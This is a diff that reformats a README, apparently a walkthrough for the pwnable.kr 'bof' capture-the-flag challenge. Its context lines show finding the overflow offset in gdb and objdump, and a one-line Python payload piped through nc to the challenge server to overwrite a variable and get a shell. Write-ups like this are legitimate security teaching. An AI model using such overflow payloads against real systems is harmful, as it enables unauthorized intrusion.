@@ -9,6 +9,8 @@ if you are using 64 bit machine you need to install these:</br>
 
 with these you can run bof in your system :) </br>
 there are 2 way to solve this problem.
+
+---
 **one** </br>
 use `gdb bof` and put breakpoint on func </br>
 use `run` command and enter 32 `A` in the input </br>
@@ -23,7 +25,8 @@ so use this command to make if condition be `TRUE` and after than write `cat fla
 ```
 $ (python -c "print 'A'*52+'\xbe\xba\xfe\xca'") | nc pwnable.kr 9000
 ```
-**TWO**
+---
+**TWO**</br>
 use `objdump`; on `func` you can see `$epb` has `0x2C` length.</br>
 in this program, memory schema is like this:
 ```
